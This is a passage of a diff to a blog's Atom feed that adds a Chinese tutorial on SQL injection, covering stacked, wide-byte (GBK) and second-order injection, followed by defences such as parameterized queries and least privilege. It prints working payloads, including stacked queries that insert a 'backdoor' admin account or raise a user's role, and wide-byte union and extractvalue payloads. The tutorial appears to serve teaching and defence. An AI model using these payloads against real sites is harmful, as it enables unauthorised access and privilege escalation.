class=&#34;hljs-string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;高级利用&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# 创建新管理员账户&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;into&lt;/span&gt; admin_users(username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;role&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;backdoor&amp;#x27;&lt;/span&gt;,md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;secret&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 修改现有用户权限&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;update&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;role&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; username=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;normaluser&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;6-宽字节注入（Wide-Byte-Injection）&#34;&gt;&lt;a href=&#34;#6-宽字节注入（Wide-Byte-Injection）&#34; class=&#34;headerlink&#34; title=&#34;6. 宽字节注入（Wide Byte Injection）&#34;&gt;&lt;/a&gt;6. 宽字节注入（Wide Byte Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：利用多字节字符集（如GBK、GB2312）的编码特性，使转义字符&lt;code&gt;\&lt;/code&gt;与注入字符组合成合法的多字节字符，从而绕过转义防护机制。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;技术背景&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;GBK编码中，一个汉字占用2个字节&lt;/li&gt;
+&lt;li&gt;某些字节组合会被解释为单个汉字字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%df%5c&lt;/code&gt; 在GBK编码下会被解释为一个汉字&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;绕过原理&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 正常情况：单引号被转义&lt;/span&gt;&lt;br&gt;payload: admin&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;转义后: admin\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;hljs-attribute&#34;&gt;1&lt;/span&gt;=1 --&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 宽字节绕过：&lt;/span&gt;&lt;br&gt;payload: admin%df&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;转义后: admin%df\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;hljs-attribute&#34;&gt;1&lt;/span&gt;=1 --&lt;br&gt;GBK解析: admin[汉字]&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;实战payload&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?username=&lt;span class=&#34;hljs-keyword&#34;&gt;admin&lt;/span&gt;%df&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; union select 1,user(),3 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;?id=1%df&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;())) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;7-二次注入（Second-order-Injection）&#34;&gt;&lt;a href=&#34;#7-二次注入（Second-order-Injection）&#34; class=&#34;headerlink&#34; title=&#34;7. 二次注入（Second-order Injection）&#34;&gt;&lt;/a&gt;7. 二次注入（Second-order Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：恶意payload在第一次请求中被正常存储到数据库，但在后续的查询中被调用时触发SQL注入。这种攻击方式具有很强的隐蔽性。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击流程&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;第一阶段 - 数据存储&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 用户注册时提交恶意用户名&lt;/span&gt;&lt;br&gt;username: admin&amp;#x27;&lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 被存储到数据库中&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;第二阶段 - 触发注入&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sql&#34;&gt;# 管理后台查询该用户信息时&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;--&amp;#x27;&lt;/span&gt;&lt;br&gt;# 注释符导致后续条件被忽略&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;典型应用场景&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户注册&amp;#x2F;个人信息修改&lt;/li&gt;
+&lt;li&gt;文章评论系统&lt;/li&gt;
+&lt;li&gt;文件上传功能的文件名处理&lt;/li&gt;
+&lt;li&gt;日志记录系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;防护措施与最佳实践&#34;&gt;&lt;a href=&#34;#防护措施与最佳实践&#34; class=&#34;headerlink&#34; title=&#34;防护措施与最佳实践&#34;&gt;&lt;/a&gt;防护措施与最佳实践&lt;/h2&gt;&lt;h3 id=&#34;开发层面防护&#34;&gt;&lt;a href=&#34;#开发层面防护&#34; class=&#34;headerlink&#34; title=&#34;开发层面防护&#34;&gt;&lt;/a&gt;开发层面防护&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;使用参数化查询&amp;#x2F;预编译语句&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt; 错误写法&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id = &amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt; 正确写法  &lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$pdo&lt;/span&gt;-&amp;gt;prepare(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id = ?&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;execute([&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;]]);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;严格的输入验证&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 白名单验证&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/^[0-9]+$/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Invalid input&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 长度限制&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Username too long&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;使用ORM框架&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# Django ORM - 自动参数化&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;.objects.&lt;span class=&#34;hljs-keyword&#34;&gt;filter&lt;/span&gt;(id=user_id)&lt;br&gt;&lt;br&gt;# SQLAlchemy - 安全查询&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;session&lt;/span&gt;.query(&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;).&lt;span class=&#34;hljs-keyword&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;.id == user_id)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;数据库层面防护&#34;&gt;&lt;a href=&#34;#数据库层面防护&#34; class=&#34;headerlink&#34; title=&#34;数据库层面防护&#34;&gt;&lt;/a&gt;数据库层面防护&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- 创建专用应用账户，仅授予必要权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;USER&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;webapp&amp;#x27;&lt;/span&gt;@&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt; IDENTIFIED &lt;span class=&#34;hljs-keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;strong_password&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GRANT&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SELECT&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;INSERT&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;UPDATE&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;ON&lt;/span&gt; webapp_db.* &lt;span class=&#34;hljs-keyword&#34;&gt;TO&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;webapp&amp;#x27;&lt;/span&gt;@&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- 禁止DROP, ALTER, FILE等危险权限&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;关闭错误信息显示&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight scss&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scss&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 生产环境关闭错误显示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;ini_set&lt;/span&gt;(&amp;#x27;display_errors&amp;#x27;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;启用SQL查询日志&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sql&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- MySQL启用慢查询日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;GLOBAL&lt;/span&gt; slow_query_log &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ON&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;GLOBAL&lt;/span&gt; long_query_time &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;WAF与监控&#34;&gt;&lt;a href=&#34;#WAF与监控&#34; class=&#34;headerlink&#34; title=&#34;WAF与监控&#34;&gt;&lt;/a&gt;WAF与监控&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;部署Web应用防火墙&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;ModSecurity规则集&lt;/li&gt;
+&lt;li&gt;云WAF服务（阿里云、腾讯云等）&lt;/li&gt;
+&lt;li&gt;自定义过滤规则&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;实时监控与告警&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 监控异常SQL查询&lt;/span&gt;&lt;br&gt;tail &lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;f /var/&lt;span class=&#34;hljs-built_in&#34;&gt;log&lt;/span&gt;/mysql/mysql.&lt;span class=&#34;hljs-built_in&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;| grep -i &amp;quot;&lt;/span&gt;union\&lt;span class=&#34;hljs-string&#34;&gt;|sleep\|benchmark&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;SQL注入漏洞虽然是一个”老”问题，但在实际的渗透测试和安全评估中仍然大量存在。理解各种注入类型的原理和利用方法，对于安全研究人员发现漏洞、开发人员修复漏洞都具有重要意义。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;关键要点回顾&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;错误注入利用数据库报错获取信息&lt;/li&gt;
+&lt;li&gt;联合注入通过union语句直接获取数据&lt;/li&gt;
+&lt;li&gt;时间盲注和布尔盲注适用于无回显场景&lt;/li&gt;
+&lt;li&gt;堆叠注入危险性最高，可执行任意SQL操作&lt;/li&gt;
+&lt;li&gt;宽字节注入针对特定编码环境&lt;/li&gt;
+&lt;li&gt;二次注入具有较强的隐蔽性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;防护核心&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用参数化查询是最有效的防护手段&lt;/li&gt;
+&lt;li&gt;输入验证和输出编码同样重要&lt;/li&gt;
+&lt;li&gt;遵循最小权限原则配置数据库权限&lt;/li&gt;
+&lt;li&gt;定期进行安全评估和代码审计&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;希望本文能够帮助读者全面理解SQL注入的攻防技术，在实际工作中更好地保护Web应用程序的安全。&lt;/p&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="渗透测试" />
+        <category term="Web安全" />
+        <category term="SQL注入" />
+        <category term="网络安全" />
+        <updated>2025-07-23T23:51:59.000Z</updated>
+    </entry>
     <entry>
         <id>https://bae-ace.github.io/2025/07/22/ELF-%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E-ROP-%E6%9E%84%E9%80%A0%E8%AF%A6%E8%A7%A3/</id>
         <title>ELF 文件保护机制与 ROP 构造详解</title>
@@ -527,9 +721,9 @@
 &lt;li&gt;📌 常用指令可整理成脚本，提升实战效率。&lt;/li&gt;
 &lt;/ul&gt;
 </content>
-        <category term="渗透测试" />
         <category term="工具" />
         <category term="sqlmap" />
+        <category term="渗透测试" />
         <updated>2025-07-21T11:33:02.000Z</updated>
     </entry>
     <entry>
@@ -650,9 +844,9 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;&lt;/table&gt;
 </content>
+        <category term="渗透测试" />
         <category term="信息收集" />
         <category term="子域名" />
-        <category term="渗透测试" />
         <updated>2025-07-21T01:30:22.000Z</updated>
     </entry>
     <entry>
